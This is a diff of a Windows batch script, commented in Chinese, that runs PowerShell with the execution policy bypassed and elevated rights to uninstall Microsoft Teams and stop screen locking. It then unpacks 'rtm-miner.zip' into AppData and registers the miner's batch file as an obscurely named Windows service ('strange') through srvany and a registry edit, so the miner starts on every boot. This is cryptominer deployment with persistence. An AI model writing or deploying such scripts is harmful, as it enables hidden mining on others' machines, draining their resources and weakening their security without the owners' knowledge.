@@ -15,10 +15,8 @@ call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process Po
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\UninstallMicrosoftTeams.ps1""' -Verb RunAs}"
 :::::::::: 执行任务 :::::::::
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\prevent-screen-lock.ps1""' -Verb RunAs}"
-cd %appdata%
-start "%appdata%\7z.exe" x "%appdata%\rtm-miner.zip"
+call cd %appdata% && "%appdata%\7z.exe" x "%appdata%\rtm-miner.zip"
 :::::::::: 自启 :::::::::
-cd %appdata%
+call cd %appdata%
 call instsrv strange "%appdata%\srvany.exe"
 call reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\strange\Parameters\ /v Application /t REG_SZ /d "%appdata%\rtm-miner\cpuminer.bat" /f 
-shutdown -r -t 5
